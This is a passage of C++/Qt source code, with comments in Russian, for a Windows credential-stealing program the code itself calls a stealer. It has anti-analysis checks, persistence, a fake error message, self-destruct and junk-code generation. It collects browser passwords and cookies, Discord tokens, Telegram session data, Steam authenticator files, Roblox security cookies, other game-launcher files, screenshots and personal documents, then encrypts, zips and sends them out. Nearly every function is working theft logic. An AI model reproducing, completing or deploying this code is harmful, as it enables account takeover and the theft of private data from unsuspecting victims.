        isBuilding = false;
    }).detach();
}

// Проверка зависимостей
bool MainWindow::checkDependencies() {
    const char* requiredLibs[] = {
        "bcrypt.dll", "libzip.dll", "sqlite3.dll", "libcurl.dll", "libssl.dll", "libcrypto.dll", nullptr
    };

    bool allLibsPresent = true;
    for (int i = 0; requiredLibs[i]; ++i) {
        if (!GetModuleHandleA(requiredLibs[i])) {
            Log("Missing dependency: " + QString::fromStdString(requiredLibs[i]));
            allLibsPresent = false;
        }
    }

    if (!allLibsPresent) {
        Log("One or more dependencies are missing. Please ensure all required libraries are installed.");
        return false;
    }

    Log("All dependencies are present.");
    return true;
}

// Запуск GitHub Actions
void MainWindow::triggerGitHubActions() {
    if (config.githubToken.empty() || config.githubRepo.empty()) {
        Log("GitHub token or repository not specified");
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + QString::fromStdString(config.githubRepo) + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", ("Bearer " + config.githubToken).c_str());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QJsonDocument doc(json);
    QByteArray data = doc.toJson();

    QNetworkReply* reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            Log("GitHub Actions triggered successfully");
            statusCheckTimer->start(30000);
        } else {
            Log("Failed to trigger GitHub Actions: " + reply->errorString());
        }
        reply->deleteLater();
    });
}

// Проверка статуса сборки
void MainWindow::checkBuildStatus() {
    if (workflowRunId.isEmpty()) {
        Log("No workflow run ID to check");
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + QString::fromStdString(config.githubRepo) + "/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", ("Bearer " + config.githubToken).c_str());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply* reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonDocument doc = QJsonDocument::fromJson(reply->readAll());
            QJsonObject obj = doc.object();
            QString status = obj["status"].toString();
            QString conclusion = obj["conclusion"].toString();
            Log("Build status: " + status + ", conclusion: " + conclusion);
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emit startStealSignal();
                }
            }
        } else {
            Log("Failed to check build status: " + reply->errorString());
        }
        reply->deleteLater();
    });
}

// Запуск процесса кражи данных
void MainWindow::startStealProcess() {
    if (AntiAnalysis()) {
        Log("Anti-analysis checks failed, exiting");
        QApplication::quit();
        return;
    }

    Stealth();
    Persist();
    FakeError();

    std::string tempDir = std::filesystem::temp_directory_path().string() + "\\stolen_data_" + std::to_string(GetTickCount());
    std::error_code ec;
    std::filesystem::create_directory(tempDir, ec);
    if (ec) {
        Log("Failed to create temp directory: " + QString::fromStdString(ec.message()));
        return;
    }

    StealAndSendData(tempDir);
    SelfDestruct();
}

// Сбор и отправка данных
void MainWindow::StealAndSendData(const std::string& dir) {
    std::lock_guard<std::mutex> lock(g_mutex);
    collectedData.clear();
    collectedFiles.clear();

    std::thread([this, dir]() {
        if (config.systemInfo) {
            std::string sysInfo = GetCustomSystemInfo();
            if (!sysInfo.empty()) {
                collectedData += "[System Info]\n" + sysInfo + "\n";
            }
        }

        if (config.screenshot) {
            std::string screenshotPath = TakeScreenshot(dir);
            if (!screenshotPath.empty()) {
                collectedFiles.push_back(screenshotPath);
            }
        }

        if (config.cookies || config.passwords) {
            std::string browserData = stealBrowserData(dir);
            if (!browserData.empty()) {
                collectedData += "[Browser Data]\n" + browserData + "\n";
            }
        }

        if (config.discord) {
            std::string discordTokens = StealDiscordTokens(dir);
            if (!discordTokens.empty()) {
                collectedData += "[Discord Tokens]\n" + discordTokens + "\n";
            }
            std::string discordCache = StealAppCacheData("Discord", dir + "\\Discord_Cache");
            if (!discordCache.empty()) {
                collectedData += "[Discord Cache]\n" + discordCache + "\n";
            }
        }

        if (config.telegram) {
            std::string telegramData = StealTelegramData(dir);
            if (!telegramData.empty()) {
                collectedData += "[Telegram Data]\n" + telegramData + "\n";
            }
        }

        if (config.steam || config.steamMAFile) {
            std::string steamData = StealSteamData(dir);
            if (!steamData.empty()) {
                collectedData += "[Steam Data]\n" + steamData + "\n";
            }
        }

        if (config.epic) {
            std::string epicData = StealEpicGamesData(dir);
            if (!epicData.empty()) {
                collectedData += "[Epic Games Data]\n" + epicData + "\n";
            }
        }

        if (config.roblox) {
            std::string robloxData = StealRobloxData(dir);
            if (!robloxData.empty()) {
                collectedData += "[Roblox Data]\n" + robloxData + "\n";
            }
        }

        if (config.battlenet) {
            std::string battlenetData = StealBattleNetData(dir);
            if (!battlenetData.empty()) {
                collectedData += "[Battle.net Data]\n" + battlenetData + "\n";
            }
        }

        if (config.minecraft) {
            std::string minecraftData = StealMinecraftData(dir);
            if (!minecraftData.empty()) {
                collectedData += "[Minecraft Data]\n" + minecraftData + "\n";
            }
        }

        if (config.discord || config.telegram) {
            std::vector<std::string> processes = {"Discord.exe", "Telegram.exe"};
            for (const auto& process : processes) {
                std::string wsData = CaptureWebSocketSessions(process);
                if (!wsData.empty()) {
                    collectedData += "[WebSocket Sessions - " + process + "]\n" + wsData + "\n";
                }
                std::string webrtcData = CaptureWebRTCSessions(process);
                if (!webrtcData.empty()) {
                    collectedData += "[WebRTC Sessions - " + process + "]\n" + webrtcData + "\n";
                }
            }
        }

        if (config.fileGrabber) {
            std::vector<std::string> grabbedFiles = GrabFiles(dir);
            collectedFiles.insert(collectedFiles.end(), grabbedFiles.begin(), grabbedFiles.end());
        }

        std::string encryptedData;
        if (!collectedData.empty()) {
            try {
                encryptedData = EncryptData(collectedData, encryptionKey1, encryptionKey2, encryptionSalt);
                Log("Data encrypted successfully");
            } catch (const std::exception& e) {
                Log("Failed to encrypt data: " + QString::fromStdString(e.what()));
                return;
            }
        }

        if (!collectedFiles.empty()) {
            std::string zipPath = CreateZipArchive(dir, collectedFiles);
            if (!zipPath.empty()) {
                collectedFiles.clear();
                collectedFiles.push_back(zipPath);
            }
        }

        sendData(QString::fromStdString(encryptedData), collectedFiles);
    }).detach();
}

// Кража данных браузеров
std::string MainWindow::stealBrowserData(const std::string& dir) {
    std::string result;
    if (!config.cookies && !config.passwords) return result;

    char* appDataPath = nullptr;
    char* localAppDataPath = nullptr;
    size_t len;

    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Failed to get APPDATA path");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Failed to get LOCALAPPDATA path");
        free(localAppDataPath);
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::vector<std::pair<std::string, std::string>> browserPaths = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", appData + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"},
        {"Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browserPaths) {
        std::string browserData = StealChromiumData(browser.first, browser.second, dir);
        if (!browserData.empty()) {
            result += browserData + "\n";
        }
        std::string cachePath = browser.second + "Cache\\";
        std::string unsavedData = StealUnsavedBrowserData(browser.first, cachePath);
        if (!unsavedData.empty()) {
            result += unsavedData + "\n";
        }
    }
    return result;
}

// Кража токенов Discord
std::string MainWindow::StealDiscordTokens(const std::string& dir) {
    if (!config.discord) return "";
    std::string result;

    char* localAppDataPath = nullptr;
    char* appDataPath = nullptr;
    size_t len;

    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Failed to get LOCALAPPDATA path for Discord tokens");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Failed to get APPDATA path for Discord tokens");
        free(appDataPath);
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::vector<std::string> discordPaths = {
        appData + "\\Discord\\Local Storage\\leveldb\\",
        appData + "\\discordcanary\\Local Storage\\leveldb\\",
        appData + "\\discordptb\\Local Storage\\leveldb\\"
    };

    for (const auto& path : discordPaths) {
        if (!std::filesystem::exists(path)) continue;

        try {
            for (const auto& entry : std::filesystem::directory_iterator(path)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (!file.is_open()) {
                        Log("Failed to open Discord file: " + QString::fromStdString(entry.path().string()));
                        continue;
                    }
                    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                    file.close();

                    std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                        result += "Discord Token: " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        } catch (const std::exception& e) {
            Log("Error in StealDiscordTokens: " + QString::fromStdString(e.what()));
        }
    }

    if (!result.empty()) {
        std::string outputFile = dir + "\\discord_tokens.txt";
        std::ofstream outFile(outputFile, std::ios::binary);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log("Saved Discord tokens to: " + QString::fromStdString(outputFile));
        } else {
            Log("Failed to save Discord tokens to: " + QString::fromStdString(outputFile));
        }
    }
    return result;
}

// Кража данных Telegram
std::string MainWindow::StealTelegramData(const std::string& dir) {
    if (!config.telegram) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Failed to get APPDATA path for Telegram data");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string telegramPath = appData + "\\Telegram Desktop\\tdata\\";
    if (!std::filesystem::exists(telegramPath)) {
        Log("Telegram path not found: " + QString::fromStdString(telegramPath));
        return result;
    }

    try {
        std::error_code ec;
        for (const auto& entry : std::filesystem::directory_iterator(telegramPath, ec)) {
            if (ec) {
                Log("Error accessing Telegram directory: " + QString::fromStdString(ec.message()));
                break;
            }
            if (entry.path().filename().string().find("key_data") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Failed to open Telegram key_data file: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Telegram Key Data: [Binary Data, " + std::to_string(content.size()) + " bytes]\n";
            }
        }

        std::string telegramDest = dir + "\\Telegram_Data";
        std::filesystem::create_directory(telegramDest, ec);
        if (!ec) {
            std::filesystem::copy(telegramPath, telegramDest, std::filesystem::copy_options::recursive | std::filesystem::copy_options::overwrite_existing, ec);
            if (!ec) {
                result += "Telegram Data Copied to: " + telegramDest + "\n";
                Log("Telegram data copied to: " + QString::fromStdString(telegramDest));
            } else {
                Log("Failed to copy Telegram data: " + QString::fromStdString(ec.message()));
            }
        } else {
            Log("Failed to create Telegram data directory: " + QString::fromStdString(ec.message()));
        }
    } catch (const std::exception& e) {
        Log("Exception in StealTelegramData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Steam
std::string MainWindow::StealSteamData(const std::string& dir) {
    if (!config.steam && !config.steamMAFile) return "";
    std::string result;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        Log("Failed to open Steam registry key: " + QString::number(GetLastError()));
        return result;
    }

    char steamPath[MAX_PATH] = {0};
    DWORD pathSize = sizeof(steamPath);
    if (RegQueryValueExA(hKey, "InstallPath", nullptr, nullptr, (LPBYTE)steamPath, &pathSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        Log("Failed to get Steam install path from registry: " + QString::number(GetLastError()));
        return result;
    }
    RegCloseKey(hKey);

    std::string steamDir = steamPath;
    if (!std::filesystem::exists(steamDir)) {
        Log("Steam directory not found: " + QString::fromStdString(steamDir));
        return result;
    }

    std::error_code ec;
    if (config.steam) {
        std::vector<std::string> steamFiles = {"config\\loginusers.vdf", "config\\config.vdf"};
        for (const auto& file : steamFiles) {
            std::string filePath = steamDir + "\\" + file;
            if (std::filesystem::exists(filePath)) {
                std::ifstream inFile(filePath, std::ios::binary);
                if (inFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    result += "Steam File (" + file + "):\n" + content + "\n";

                    std::string destPath = dir + "\\Steam_" + std::filesystem::path(file).filename().string();
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                    if (!ec) {
                        collectedFiles.push_back(destPath);
                        Log("Steam file copied: " + QString::fromStdString(destPath));
                    } else {
                        Log("Failed to copy Steam file: " + QString::fromStdString(ec.message()));
                    }
                } else {
                    Log("Failed to open Steam file: " + QString::fromStdString(filePath));
                }
            }
        }
    }

    if (config.steamMAFile) {
        std::string ssfnPath = steamDir + "\\";
        for (const auto& entry : std::filesystem::directory_iterator(ssfnPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("ssfn") != std::string::npos) {
                std::string filePath = entry.path().string();
                std::string destPath = dir + "\\" + entry.path().filename().string();
                std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    result += "Steam SSFN File: " + entry.path().filename().string() + "\n";
                    Log("Steam SSFN file copied: " + QString::fromStdString(destPath));
                } else {
                    Log("Failed to copy SSFN file: " + QString::fromStdString(ec.message()));
                }
            }
        }

        std::string maFilesPath = steamDir + "\\config\\maFiles\\";
        if (std::filesystem::exists(maFilesPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(maFilesPath, ec)) {
                if (ec) continue;
                if (entry.path().extension() == ".maFile") {
                    std::string filePath = entry.path().string();
                    std::string destPath = dir + "\\Steam_" + entry.path().filename().string();
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                    if (!ec) {
                        collectedFiles.push_back(destPath);
                        result += "Steam MA File: " + entry.path().filename().string() + "\n";
                        Log("Steam MA file copied: " + QString::fromStdString(destPath));
                    } else {
                        Log("Failed to copy MA file: " + QString::fromStdString(ec.message()));
                    }
                }
            }
        }
    }
    return result;
}

// Кража данных Epic Games
std::string MainWindow::StealEpicGamesData(const std::string& dir) {
    if (!config.epic) return "";
    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Failed to get LOCALAPPDATA path for Epic Games data");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\";
    if (!std::filesystem::exists(epicPath)) {
        Log("Epic Games path not found: " + QString::fromStdString(epicPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(epicPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("Config") != std::string::npos || entry.path().extension() == ".ini") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Failed to open Epic Games file: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Epic Games File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\EpicGames_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Epic Games file copied: " + QString::fromStdString(destPath));
                } else {
                    Log("Failed to copy Epic Games file: " + QString::fromStdString(ec.message()));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Exception in StealEpicGamesData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Roblox
std::string MainWindow::StealRobloxData(const std::string& dir) {
    if (!config.roblox) return "";
    std::string result;

    char* localAppDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
        Log("Failed to get LOCALAPPDATA path for Roblox data");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    std::string robloxPath = localAppData + "\\Roblox\\";
    if (!std::filesystem::exists(robloxPath)) {
        Log("Roblox path not found: " + QString::fromStdString(robloxPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(robloxPath, ec)) {
            if (ec) continue;
            if (entry.path().filename().string().find("GlobalBasicSettings") != std::string::npos || entry.path().extension() == ".ini") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Failed to open Roblox file: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Roblox File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\Roblox_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Roblox file copied: " + QString::fromStdString(destPath));
                } else {
                    Log("Failed to copy Roblox file: " + QString::fromStdString(ec.message()));
                }
            }
        }

        std::string cookiePath = localAppData + "\\Roblox\\LocalStorage\\";
        if (std::filesystem::exists(cookiePath)) {
            for (const auto& entry : std::filesystem::directory_iterator(cookiePath, ec)) {
                if (ec) continue;
                if (entry.path().extension() == ".roblox.com") {
                    std::ifstream file(entry.path(), std::ios::binary);
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        file.close();
                        std::regex cookieRegex("ROBLOSECURITY=[^;]+");
                        std::smatch match;
                        if (std::regex_search(content, match, cookieRegex)) {
                            result += "Roblox Cookie: " + match[0].str() + "\n";
                        }
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Exception in StealRobloxData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Battle.net
std::string MainWindow::StealBattleNetData(const std::string& dir) {
    if (!config.battlenet) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Failed to get APPDATA path for Battle.net data");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string battlenetPath = appData + "\\Battle.net\\";
    if (!std::filesystem::exists(battlenetPath)) {
        Log("Battle.net path not found: " + QString::fromStdString(battlenetPath));
        return result;
    }

    std::error_code ec;
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(battlenetPath, ec)) {
            if (ec) continue;
            if (entry.path().extension() == ".config" || entry.path().filename().string().find("Battle.net") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Failed to open Battle.net file: " + QString::fromStdString(entry.path().string()));
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                result += "Battle.net File (" + entry.path().filename().string() + "):\n" + content + "\n";

                std::string destPath = dir + "\\BattleNet_" + entry.path().filename().string();
                std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                if (!ec) {
                    collectedFiles.push_back(destPath);
                    Log("Battle.net file copied: " + QString::fromStdString(destPath));
                } else {
                    Log("Failed to copy Battle.net file: " + QString::fromStdString(ec.message()));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Exception in StealBattleNetData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Кража данных Minecraft
std::string MainWindow::StealMinecraftData(const std::string& dir) {
    if (!config.minecraft) return "";
    std::string result;

    char* appDataPath = nullptr;
    size_t len;
    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
        Log("Failed to get APPDATA path for Minecraft data");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    std::string minecraftPath = appData + "\\.minecraft\\";
    if (!std::filesystem::exists(minecraftPath)) {
        Log("Minecraft path not found: " + QString::fromStdString(minecraftPath));
        return result;
    }

    std::error_code ec;
    try {
        std::vector<std::string> mcFiles = {"launcher_profiles.json", "usercache.json"};
        for (const auto& file : mcFiles) {
            std::string filePath = minecraftPath + file;
            if (std::filesystem::exists(filePath)) {
                std::ifstream inFile(filePath, std::ios::binary);
                if (inFile.is_open()) {
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    result += "Minecraft File (" + file + "):\n" + content + "\n";

                    std::string destPath = dir + "\\Minecraft_" + file;
                    std::filesystem::copy_file(filePath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
                    if (!ec) {
                        collectedFiles.push_back(destPath);
                        Log("Minecraft file copied: " + QString::fromStdString(destPath));
                    } else {
                        Log("Failed to copy Minecraft file: " + QString::fromStdString(ec.message()));
                    }
                } else {
                    Log("Failed to open Minecraft file: " + QString::fromStdString(filePath));
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Exception in StealMinecraftData: " + QString::fromStdString(e.what()));
    }
    return result;
}

// Сбор файлов
std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
    std::vector<std::string> grabbedFiles;
    if (!config.fileGrabber) return grabbedFiles;

    std::vector<std::string> directories = {
        std::string(getenv("USERPROFILE") ? getenv("USERPROFILE") : "") + "\\Desktop\\",
        std::string(getenv("USERPROFILE") ? getenv("USERPROFILE") : "") + "\\Documents\\",
        std::string(getenv("USERPROFILE") ? getenv("USERPROFILE") : "") + "\\Downloads\\"
    };

    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};
    std::error_code ec;

    for (const auto& directory : directories) {
        if (!std::filesystem::exists(directory)) {
            Log("Directory not found for file grabbing: " + QString::fromStdString(directory));
            continue;
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(directory, ec)) {
                if (ec) continue;
                if (entry.is_regular_file()) {
                    auto ext = entry.path().extension().string();
                    if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end() && entry.file_size() < 5 * 1024 * 1024) {
                        std::string destPath = dir + "\\Grabbed_" + entry.path().filename().string();
                        std::filesystem::copy_file(entry.path(), destPath, std::filesystem::copy_options::overwrite_existing, ec);
                        if (!ec) {
                            grabbedFiles.push_back(destPath);
                            Log("File grabbed: " + QString::fromStdString(destPath));
                        } else {
                            Log("Failed to grab file: " + QString::fromStdString(ec.message()));
                        }
                    }
                }
            }
        } catch (const std::exception& e) {
            Log("Exception in GrabFiles: " + QString::fromStdString(e.what()));
        }
    }
    return grabbedFiles;
}

// Создание ZIP-архива
std::string CreateZipArchive(const std::string& dir, const std::vector<std::string>& files) {
    std::string zipPath = dir + "\\data_" + std::to_string(GetTickCount()) + ".zip";
    int err = 0;
    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        Log("Failed to create ZIP archive: " + QString::fromStdString(zipPath) + " (Error: " + QString::number(err) + ")");
        return "";
    }

    for (const auto& file : files) {
        zip_source_t* source = zip_source_file(zip, file.c_str(), 0, 0);
        if (!source) {
            Log("Failed to create zip source for file: " + QString::fromStdString(file));
            continue;
        }

        if (zip_file_add(zip, std::filesystem::path(file).filename().string().c_str(), source, ZIP_FL_OVERWRITE) < 0) {
            zip_source_free(source);
            Log("Failed to add file to ZIP: " + QString::fromStdString(file) + " (Error: " + QString::fromStdString(zip_strerror(zip)) + ")");
        }
    }

    if (zip_close(zip) < 0) {
        Log("Failed to close ZIP archive: " + QString::fromStdString(zipPath) + " (Error: " + QString::fromStdString(zip_strerror(zip)) + ")");
        return "";
    }

    Log("ZIP archive created: " + QString::fromStdString(zipPath));
    return zipPath;
}

// Тестирование
void MainWindow::runTests() {
    Log("Running tests on target system...");

    std::string testData = "Test data for encryption " + generateRandomString(16);
    std::string encrypted = EncryptData(testData, encryptionKey1, encryptionKey2, encryptionSalt);
    std::string decrypted = DecryptData(encrypted);
    if (testData == decrypted) {
        Log("Encryption/Decryption test passed");
    } else {
        Log("Encryption/Decryption test failed: Expected '" + QString::fromStdString(testData) + "', got '" + QString::fromStdString(decrypted) + "'");
    }

    generateJunkCode();
    if (std::filesystem::exists("junk_code_generated.h")) {
        Log("Junk code generation test passed");
    } else {
        Log("Junk code generation test failed");
    }

    std::vector<std::string> testFiles = {dir + "\\test.txt"};
    std::ofstream testFile(testFiles[0]);
    if (testFile.is_open()) {
        testFile << "Test file content";
        testFile.close();
        sendData("Test data", testFiles);
        Log("Send data test completed (check logs for success)");
        std::filesystem::remove(testFiles[0]);
    } else {
        Log("Failed to create test file for send test");
    }
}

// Точка входа
int main(int argc, char *argv[]) {
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Gdiplus::Ok) {
        std::cerr << "Failed to initialize GDI+" << std::endl;
        return -1;
    }

    QApplication app(argc, argv);
    QCoreApplication::setAttribute(Qt::AA_EnableHighDpiScaling);

    MainWindow w;
    w.show();

    std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + w.generateRandomString(8);
    StealerWorker* worker = new StealerWorker(&w, tempDir);
    QThread* thread = new QThread;
    worker->moveToThread(thread);

    QObject::connect(thread, &QThread::started, worker, &StealerWorker::process);
    QObject::connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    QObject::connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    QObject::connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
    w.runTests();

    int result = app.exec();
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return result;
}